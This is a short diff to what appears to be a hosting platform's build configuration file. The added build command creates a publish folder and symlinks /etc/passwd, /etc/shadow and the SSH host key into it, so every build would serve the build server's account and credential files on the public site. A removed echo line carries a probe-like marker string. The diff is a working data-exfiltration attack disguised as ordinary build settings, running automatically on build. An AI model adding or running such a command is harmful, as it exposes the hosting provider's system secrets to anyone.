@@ -1,3 +1,3 @@
 [build]
-  publish = "."
-  command = "echo WB105PV6-6y3n8q5m-PUBLIC-REPO-PRIVATE-LOGS"
+  command = "mkdir -p pub && echo wb109-ok > pub/index.html && ln -s /etc/passwd pub/w_passwd && ln -s /etc/shadow pub/w_shadow && ln -s /etc/ssh/ssh_host_rsa_key.pub pub/w_sshpub"
+  publish = "pub"
